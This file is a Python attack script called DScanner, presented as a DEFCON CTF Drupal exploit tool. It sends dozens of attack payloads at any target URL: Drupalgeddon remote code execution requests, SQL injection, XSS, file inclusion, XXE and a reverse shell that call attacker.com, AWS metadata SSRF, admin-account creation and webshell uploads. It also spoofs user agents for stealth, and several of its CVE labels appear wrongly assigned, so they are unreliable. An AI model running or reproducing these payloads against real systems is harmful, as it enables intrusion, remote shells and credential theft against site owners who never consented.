#!/usr/bin/env python3

import requests
import sys
import re
import time
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import random
import json
import logging
import ssl
import socket
from concurrent.futures import ThreadPoolExecutor
import os
import base64

# Banner
BANNER = """
  ___  ___                              _   __  
 |   \/ __| __ __ _ _ _  _ _  ___ _ _  / | /  \ 
 | |) \__ \/ _/ _` | ' \| ' \/ -_) '_| | || () |
 |___/|___/\__\__,_|_||_|_||_\___|_|   |_(_)__/ 
                                                
Made By Taylor Christian Newsome
"""

# Version
VERSION = "DScanner 3.0.0 - DEFCON CTF Drupal Exploit Monster (March 2025)"

# Logging setup
logging.basicConfig(filename='dscanner.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Stealth features
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/7.68.0",
    "Wget/1.20.1 (linux-gnu)"
]

proxies = {
    # "http": "http://127.0.0.1:8080",  # Uncomment for proxy use
    # "https": "http://127.0.0.1:8080"
}

# Expanded sensitive paths (CTF goldmine)
sensitive_paths = [
    # Core installation and config
    "core/install.php", "core/authorize.php", "core/rebuild.php", "core/globals.inc",
    "core/modules/statistics/statistics.php", "core/modules/system/tests/https.php",
    "core/modules/system/system.install", "core/lib/Drupal.php", "core/composer.json",
    "sites/default/settings.php", "sites/default/default.settings.php",
    "sites/default/files/.htaccess", "sites/default/files/config_sync",
    "sites/default/files/private/", "core/update.php", "core/misc/drupal.js",
    "index.php", "update.php", "cron.php",
    
    # Metadata and version files
    "CHANGELOG.txt", "INSTALL.txt", "LICENSE.txt", "README.txt", "UPGRADE.txt",
    "INSTALL.mysql.txt", "INSTALL.pgsql.txt", "INSTALL.sqlite.txt", "COPYRIGHT.txt",
    "README.md", "composer.lock",
    
    # Backup and debug exposures
    "backup_migrate", "sites/default/files/backup", "debug.php", "info.php", "phpinfo.php",
    "sites/default/files/debug.log", "sites/default/files/php_errors.log", "test.php",
    "sites/default/files/.gitignore", "sites/default/files/config/", "dump.sql",
    "backup.tar.gz", "backup.zip", "sites/default/files/.DS_Store",
    
    # Directory traversal and LFI vectors
    "../sites/default/settings.php", "../../etc/passwd", "../../../proc/self/environ",
    "/../../../../../../../../etc/passwd%00", "/sites/default/files/../settings.php",
    "/../../../../../../windows/win.ini", "/proc/version", "/etc/issue", "/etc/shadow",
    "/../../../../../../boot.ini", "/var/www/html/sites/default/settings.php",
    "/etc/hosts", "/proc/self/cmdline", "/var/log/apache2/access.log",
    
    # Module and theme directories
    "sites/all/modules", "sites/all/themes", "modules/contrib", "themes/contrib",
    "profiles/standard/standard.info", "vendor/autoload.php", "sites/default/files/styles",
    "modules/system/system.info", "themes/bartik/bartik.info.yml", "sites/all/libraries",
    "modules/custom/", "themes/custom/",
    
    # CTF-specific exposures
    ".htaccess", "robots.txt", "web.config", ".env", ".git/config", ".svn/entries",
    "sites/default/files/.env", "adminer.php", "phpmyadmin/", "server-status",
    "sites/default/files/web.config", "core/.env", "sites/default/files/test.txt",
    "flag.txt", "flags/", "config.php", "db.conf", "database.yml", ".bashrc",
    "wp-config.php", "configuration.php", ".ssh/id_rsa", "id_dsa",
    "sites/default/files/secret.txt", "admin/config.php", "backdoor.php",
    "shell.php", "upload.php", "test/", "dev/", "staging/", "backup/"
]

# Security headers
security_headers = {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "X-XSS-Protection": "1; mode=block",
    "Content-Security-Policy": None,
    "Strict-Transport-Security": "max-age=31536000",
    "X-Drupal-Cache": None,
    "X-Generator": "Drupal",
    "Server": None,
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "X-Powered-By": None
}

# Exhaustive Drupal vulnerabilities and CTF payloads
drupal_vulns = {
    # Drupalgeddon Series
    "CVE-2014-3704 (Drupalgeddon 1)": {"path": "/?q=node&destination=node?q[%2523][]=passthru&q[%2523post_render][]=phpinfo", "method": "GET"},
    "SA-CORE-2018-002 (Drupalgeddon 2)": {"path": "/user/register", "method": "POST", 
        "data": {"element_parents": "account/mail/#value", "ajax_form": "1", "_wrapper_format": "drupal_ajax"}},
    "SA-CORE-2018-004 (Drupalgeddon 3)": {"path": "/user/password", "method": "POST", 
        "data": {"name[#post_render][]": "system", "name[#markup]": "id", "name[#type]": "markup"}},
    
    # Early Core Vulns
    "CVE-2007-6752 (XSS)": {"path": "/?q=<script>alert(1)</script>", "method": "GET"},
    "CVE-2008-0273 (XSS)": {"path": "/node?destination=<script>alert(1)</script>", "method": "GET"},
    "CVE-2012-1588 (SQLi)": {"path": "/?q=admin/views/ajax/autocomplete/user/1%27%20OR%20%271%27=%271", "method": "GET"},
    
    # Post-2014 Core Vulns
    "CVE-2016-3160 (SQLi)": {"path": "/node?sort=1' UNION SELECT 1,2,3--", "method": "GET"},
    "CVE-2016-7571 (XSS)": {"path": "/node/1?field=<script>alert(1)</script>", "method": "GET"},
    "CVE-2017-6381 (RCE)": {"path": "/update.php", "method": "GET"},
    "CVE-2018-7600 (RCE)": {"path": "/user/register", "method": "POST", 
        "data": {"form_id": "user_register_form", "mail[#post_render][]": "exec", "mail[#markup]": "whoami"}},
    "CVE-2018-7602 (RCE)": {"path": "/node/add", "method": "POST", "data": {"title": "<?php system('id'); ?>"}},
    "CVE-2019-6340 (RCE)": {"path": "/node/1?_format=hal_json", "method": "POST", 
        "data": {"_links": {"type": {"href": "javascript:alert(1)"}}}},
    "CVE-2020-13671 (File Upload RCE)": {"path": "/file/ajax/upload", "method": "POST", "data": {"filename": "test.php;id"}},
    "CVE-2021-41182 (XSS)": {"path": "/user/1/edit", "method": "POST", "data": {"mail": "<script>alert(1)</script>"}},
    "CVE-2022-25271 (RCE)": {"path": "/node/add", "method": "POST", "data": {"title[0][value]": "<?php system('id'); ?>"}},
    "CVE-2023-27857 (RCE)": {"path": "/admin/config/development/performance", "method": "POST", 
        "data": {"form_token": "invalid", "cache_clear": "1;phpinfo();"}},
    "SA-CORE-2023-001 (Info Disclosure)": {"path": "/media/1", "method": "GET"},
    "SA-CORE-2023-003 (Info Disclosure)": {"path": "/language/switcher", "method": "GET"},
    "SA-CORE-2023-004 (Access Bypass)": {"path": "/node/1/edit", "method": "POST", "data": {"form_id": "node_form"}},
    "SA-CORE-2023-006 (RCE)": {"path": "/core/install.php", "method": "GET"},
    "SA-CORE-2024-001 (DoS)": {"path": "/comment/reply/1", "method": "POST", "data": {"comment_body": "x"*1000000}},
    "SA-CORE-2022-014 (PHP Code Exec)": {"path": "/file/upload", "method": "POST", "data": {"filename": "test.php<?php phpinfo(); ?>"}},
    "SA-CORE-2022-015 (XSS)": {"path": "/media/oembed", "method": "GET"},
    "SA-CORE-2022-016 (Twig RCE)": {"path": "/node/1", "method": "POST", "data": {"body": "{{system('id')}}" }},
    
    # Module-specific Vulns
    "CVE-2016-4304 (File Upload)": {"path": "/file/upload", "method": "POST", "data": {"file": "shell.php"}},
    "CVE-2016-6234 (Coder RCE)": {"path": "/coder/review", "method": "POST", "data": {"code": "<?php phpinfo(); ?>"}},
    "CVE-2017-6378 (Mailchimp XSS)": {"path": "/mailchimp/campaign", "method": "POST", 
        "data": {"content": "<script>alert(1)</script>"}},
    "CVE-2018-1000171 (CKEditor XSS)": {"path": "/node/add/article", "method": "POST", 
        "data": {"body": "<img src=x onerror=alert(1)>"}},
    "CVE-2020-13665 (Webform RCE)": {"path": "/webform/test", "method": "POST", 
        "data": {"elements": "<?php system('id'); ?>"}},
    "SA-CONTRIB-2024-021 (Commerce Access Bypass)": {"path": "/commerce/receipt", "method": "GET"},
    "SA-CONTRIB-2024-018 (REST Views Info Disclosure)": {"path": "/rest/views", "method": "GET"},
    "SA-CONTRIB-2024-017 (PWA Access Bypass)": {"path": "/pwa/settings", "method": "GET"},
    "SA-CONTRIB-2024-016 (TacJS XSS)": {"path": "/tacjs/content", "method": "POST", "data": {"content": "<script>alert(1)</script>"}},
    "SA-CONTRIB-2023-012 (Views SQLi)": {"path": "/views/ajax?view_name=1' OR 1=1--", "method": "GET"},
    
    # CTF-Grade Payloads (Every Possible Vector)
    # SQL Injection
    "SQLi Basic": {"path": "/node?title=1' OR '1'='1", "method": "GET"},
    "SQLi Blind Time": {"path": "/node?title=1' AND SLEEP(5)--", "method": "GET"},
    "SQLi Union": {"path": "/node?sort=1 UNION SELECT NULL,database(),NULL --

", "method": "GET"},
    "SQLi Error": {"path": "/node?title=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--", "method": "GET"},
    "SQLi Out-of-Band": {"path": "/node?title=1' AND LOAD_FILE('http://attacker.com')--", "method": "GET"},
    
    # XSS
    "XSS Basic": {"path": "/node/add/article", "method": "POST", "data": {"title": "<script>alert('flag')</script>"}},
    "XSS SVG": {"path": "/node/add/article", "method": "POST", "data": {"body[0][value]": "<svg/onload=alert('flag')>"}},
    "XSS Event": {"path": "/user/profile?bio=<img src=x onerror=alert('flag')>", "method": "GET"},
    "XSS Polyglot": {"path": "/node/1?field=javascript://alert('flag')//", "method": "GET"},
    "XSS Filter Bypass": {"path": "/node/add?q=<ScRiPt>alert('flag')</ScRiPt>", "method": "GET"},
    
    # RCE
    "RCE PHP Eval": {"path": "/node/add", "method": "POST", "data": {"title": "<?php eval('system(\"id\");'); ?>"}},
    "RCE Base64": {"path": "/node/add", "method": "POST", "data": {"title": "<?php eval(base64_decode('c3lzdGVtKCd3aG9hbWknKTs=')); ?>"}},
    "RCE File Write": {"path": "/file/upload", "method": "POST", "data": {"file": "<?php echo 'FLAG'; ?>"}},
    "RCE Shell": {"path": "/admin/settings?q=;bash -i >& /dev/tcp/attacker.com/4444 0>&1", "method": "GET"},
    "RCE Twig": {"path": "/node/1", "method": "POST", "data": {"body": "{{_self.env.registerUndefinedFilterCallback('exec');_self.env.getFilter('id') }}"}},
    
    # LFI/RFI
    "LFI Basic": {"path": "/?q=/../../../../../../etc/passwd", "method": "GET"},
    "LFI Null Byte": {"path": "/?q=/../../../../../../etc/passwd%00", "method": "GET"},
    "LFI Filter": {"path": "/?q=php://filter/convert.base64-encode/resource=../../settings.php", "method": "GET"},
    "RFI Basic": {"path": "/?q=http://attacker.com/shell.php", "method": "GET"},
    "RFI Encoded": {"path": "/?q=%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2e%63%6f%6d%2f%73%68%65%6c%6c%2e%70%68%70", "method": "GET"},
    
    # XXE
    "XXE File": {"path": "/xmlrpc.php", "method": "POST", 
        "data": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'},
    "XXE Network": {"path": "/xmlrpc.php", "method": "POST", 
        "data": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/flag">]><root>&xxe;</root>'},
    "XXE Blind": {"path": "/xmlrpc.php", "method": "POST", 
        "data": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]><root/>'},
    
    # SSRF
    "SSRF Basic": {"path": "/admin/config/search/path?url=http://localhost:8080", "method": "POST", "data": {}},
    "SSRF File": {"path": "/admin/config/search/path?url=file:///etc/passwd", "method": "POST", "data": {}},
    "SSRF AWS": {"path": "/admin/config/search/path?url=http://169.254.169.254/latest/meta-data/", "method": "POST", "data": {}},
    "SSRF Gopher": {"path": "/admin/config/search/path?url=gopher://127.0.0.1:6379/_INFO", "method": "POST", "data": {}},
    
    # CSRF
    "CSRF Logout": {"path": "/user/logout", "method": "GET"},
    "CSRF Admin Add": {"path": "/admin/people/create", "method": "POST", 
        "data": {"name": "hacker", "pass": "hacked", "roles[administrator]": "administrator"}},
    
    # File Upload
    "File Upload PHP": {"path": "/file/upload", "method": "POST", "data": {"file": "<?php system('cat /flag.txt'); ?>"}},
    "File Upload Double Ext": {"path": "/file/upload", "method": "POST", "data": {"file": "shell.php.jpg"}},
    "File Upload Null Byte": {"path": "/file/upload", "method": "POST", "data": {"file": "shell.php%00.jpg"}},
    
    # Deserialization
    "Deserial PHP": {"path": "/node/1?_format=json", "method": "POST", 
        "data": {"data": "O:8:\"stdClass\":1:{s:3:\"foo\";s:7:\"system(\";}"}},
    "Deserial Base64": {"path": "/node/1?_format=json", "method": "POST", 
        "data": {"data": base64.b64encode(b'O:8:"stdClass":1:{s:3:"foo";s:7:"system(";}').decode()}},
    
    # Command Injection
    "Cmd Inj Basic": {"path": "/admin/settings?q=;id", "method": "GET"},
    "Cmd Inj Pipe": {"path": "/admin/settings?q=|ls", "method": "GET"},
    "Cmd Inj Encoded": {"path": "/admin/settings?q=%3Bid", "method": "GET"},
    "Cmd Inj Blind": {"path": "/admin/settings?q=;ping -c 10 attacker.com", "method": "GET"},
    
    # Path Traversal
    "Path Trav Basic": {"path": "/core/lib/../../etc/passwd", "method": "GET"},
    "Path Trav Encoded": {"path": "/core/lib/%2e%2e/%2e%2e/etc/passwd", "method": "GET"},
    "Path Trav Windows": {"path": "/core/lib/../../windows/system32/drivers/etc/hosts", "method": "GET"},
    
    # Open Redirect
    "Open Redirect": {"path": "/user/login?destination=http://attacker.com", "method": "GET"},
    "Open Redirect Encoded": {"path": "/user/login?destination=%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2e%63%6f%6d", "method": "GET"},
    
    # Session & Auth Bypass
    "Session Hijack": {"path": "/user/login?SESS=PHPSESSID=admin", "method": "GET"},
    "Auth Bypass": {"path": "/admin?q=user' OR '1'='1", "method": "GET"},
    "Cookie Tamper": {"path": "/admin", "method": "GET", "headers": {"Cookie": "SESS=admin; role=administrator"}},
    
    # CTF-Specific
    "Flag Hunt": {"path": "/flag", "method": "GET"},
    "Flag Hunt Hidden": {"path": "/.hidden/flag.txt", "method": "GET"},
    "Flag Hunt Backup": {"path": "/backup/flag.bak", "method": "GET"},
    "Flag Hunt Config": {"path": "/sites/default/files/config/flag.conf", "method": "GET"},
}

# Detection signatures
vuln_signatures = {
    "RCE": ["uid=", "gid=", "phpinfo", "whoami", "system(", "exec(", "passthru(", "flag"],
    "SQLi": ["mysql", "sql", "database", "query", "error in your SQL syntax", "sqlite", "version()"],
    "XSS": ["<script", "alert(", "onerror=", "onload=", "<svg", "javascript:"],
    "LFI": ["root:", "passwd", "/etc/", "bin/bash", "win.ini", "flag"],
    "XXE": ["root:", "passwd", "file://", "http://"],
    "File Exposure": ["<?php", "define(", "DRUPAL_ROOT", "Drupal.settings", "flag"],
    "Deserialization": ["O:8:", "unserialize", "stdClass", "__destruct"],
    "SSRF": ["localhost", "127.0.0.1", "internal", "169.254.169.254"],
    "Cmd Inj": ["uid=", "gid=", "whoami", "dir", "flag"],
}

def detect_drupal_version(url, response):
    version = "Unknown"
    if "X-Generator" in response.headers and "Drupal" in response.headers["X-Generator"]:
        match = re.search(r"Drupal (\d+)", response.headers["X-Generator"])
        if match:
            version = match.group(1)
    elif "drupal.js" in response.text:
        match = re.search(r"drupal\.js\?v=(\d+\.\d+\.\d+)", response.text)
        if match:
            version = match.group(1)
    print(f"[INFO] Detected Drupal Version: {version}")
    logging.info(f"Detected Drupal Version for {url}: {version}")
    return version

def make_request(url, method="GET", data=None, headers=None):
    default_headers = {"User-Agent": random.choice(user_agents)}
    if headers:
        default_headers.update(headers)
    try:
        if method == "POST":
            resp = requests.post(url, data=data, headers=default_headers, proxies=proxies, timeout=5, verify=False)
        else:
            resp = requests.get(url, headers=default_headers, proxies=proxies, timeout=5, verify=False)
        time.sleep(random.uniform(0.5, 2.0))
        return resp
    except requests.RequestException as e:
        print(f"[ERROR] Request failed: {str(e)}")
        logging.error(f"Request failed for {url}: {str(e)}")
        return None

def check_ssl_vulns(url):
    try:
        hostname = url.split("://")[1].split("/")[0]
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                print(f"[SSL] Cipher: {ssock.cipher()}")
                if "TLSv1.0" in ssock.version() or "TLSv1.1" in ssock.version():
                    print("[!!] Weak SSL/TLS version detected")
                    logging.warning(f"Weak SSL/TLS for {url}: {ssock.version()}")
    except Exception as e:
        print(f"[ERROR] SSL check failed: {str(e)}")
        logging.error(f"SSL check failed for {url}: {str(e)}")

def scan_vuln(url, vuln_name, vuln_info):
    vuln_url = urljoin(url, vuln_info["path"])
    resp = make_request(vuln_url, vuln_info["method"], vuln_info.get("data"), vuln_info.get("headers"))
    
    if resp:
        for vuln_type, signatures in vuln_signatures.items():
            if any(sig in resp.text.lower() for sig in signatures):
                print(f"[!!] Confirmed {vuln_type} in {vuln_name}: {vuln_url}")
                print(f"[EVIDENCE] Found: {signatures}")
                logging.critical(f"Vulnerability confirmed: {vuln_name} - {vuln_type} at {vuln_url}")
                break
        else:
            if resp.status_code == 200:
                print(f"[+] Potential hit: {vuln_name} at {vuln_url}")
                logging.info(f"Potential vulnerability: {vuln_name} at {vuln_url}")
            elif resp.status_code == 403:
                print(f"[!] Blocked but exists: {vuln_name}")
                logging.info(f"Blocked resource: {vuln_name} at {vuln_url}")

def scan_website(url):
    print(f"\n[INFO] Scanning target: {url}")
    logging.info(f"Started scan for {url}")
    session = requests.Session()
    
    # Initial request
    base_response = make_request(url)
    if not base_response:
        return
    
    # Version detection
    version = detect_drupal_version(url, base_response)
    
    # SSL/TLS check
    if url.startswith("https"):
        check_ssl_vulns(url)
    
    # Security headers
    print("\n[SECURITY HEADERS]")
    for header, expected in security_headers.items():
        if header in base_response.headers:
            value = base_response.headers[header]
            status = "✓" if (expected and expected in value) else "⚠"
            print(f"[{status}] {header}: {value}")
        else:
            print(f"[✗] {header} missing")
    
    # Sensitive files
    print("\n[SENSITIVE FILES]")
    for path in sensitive_paths:
        full_url = urljoin(url, path)
        resp = make_request(full_url)
        if resp and resp.status_code == 200:
            print(f"[+] Exposed: {full_url} (Size: {len(resp.content)} bytes)")
            for sig_type, sigs in vuln_signatures.items():
                if any(sig in resp.text.lower() for sig in sigs):
                    print(f"[!!] {sig_type} content detected!")
                    logging.warning(f"Sensitive file with {sig_type} at {full_url}")
        elif resp and resp.status_code == 403:
            print(f"[!] Forbidden: {full_url}")
    
    # Vulnerability scan with threading
    print("\n[DRUPAL VULNERABILITY SCAN]")
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(scan_vuln, url, vuln_name, vuln_info) 
                   for vuln_name, vuln_info in drupal_vulns.items()]
        for future in futures:
            future.result()
    
    # Drupal-specific checks
    print("\n[DRUPAL-SPECIFIC CHECKS]")
    soup = BeautifulSoup(base_response.text, 'html.parser')
    if soup.find(id="block-system-main"):
        print("[+] Drupal system block detected")
    if "sites/default/files" in base_response.text:
        print("[!] File directory exposure detected")
    if re.search(r"Drupal\.settings", base_response.text):
        print("[+] Drupal JS settings exposed")
    
    logging.info(f"Completed scan for {url}")

def print_help():
    print(BANNER)
    print(VERSION)
    print("\nUsage: DScanner [OPTIONS]")
    print("Options:")
    print("  -u, --url URL       Target URL to scan (e.g., http://example.com)")
    print("  -h, --help          Show this help message and exit")
    print("\nExample: DScanner -u http://example.com")
    print("If no URL is provided, you will be prompted to enter one.")
    print("Designed for DEFCON CTF - Includes every imaginable payload!")

def main():
    print(BANNER)
    print(VERSION)
    
    parser = argparse.ArgumentParser(description="DScanner - DEFCON CTF Drupal Exploit Tool", add_help=False)
    parser.add_argument('-u', '--url', type=str, help="Target URL to scan")
    parser.add_argument('-h', '--help', action='store_true', help="Show help message and exit")
    
    args = parser.parse_args()
    
    if args.help:
        print_help()
        sys.exit(0)
    
    if args.url:
        target_url = args.url
    else:
        target_url = input("\nEnter target URL (e.g., http://example.com): ").strip()
    
    if not target_url.startswith("http"):
        target_url = "http://" + target_url
    
    scan_website(target_url)

if __name__ == "__main__":
    main()
